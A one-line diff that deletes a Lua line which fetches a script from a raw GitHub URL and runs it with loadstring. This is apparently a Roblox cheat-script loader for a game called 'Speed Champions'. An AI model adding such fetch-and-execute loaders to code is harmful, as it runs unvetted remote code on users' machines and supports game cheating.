@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Speed%20Champions", true))()
